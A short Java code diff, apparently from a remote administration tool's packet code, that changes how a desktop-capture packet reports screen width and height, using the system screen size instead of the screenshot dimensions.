@@ -1,5 +1,7 @@
 package de.sogomn.rat.packet;
 
+import java.awt.Dimension;
+import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.util.ArrayList;
 import java.util.stream.Stream;
@@ -89,6 +91,7 @@ public final class DesktopPacket extends AbstractPingPongPacket {
 	@Override
 	protected void executeRequest(final ActiveConnection connection) {
 		final BufferedImage screenshot = FrameEncoder.captureScreen();
+		final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
 		
 		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
 			final IFrame frame = new IFrame(0, 0, screenshot);
@@ -102,8 +105,8 @@ public final class DesktopPacket extends AbstractPingPongPacket {
 		}
 		
 		type = DATA;
-		screenWidth = screenshot.getWidth();
-		screenHeight = screenshot.getHeight();
+		screenWidth = screenSize.width;
+		screenHeight = screenSize.height;
 		lastScreenshot = screenshot;
 		
 		connection.addPacket(this);
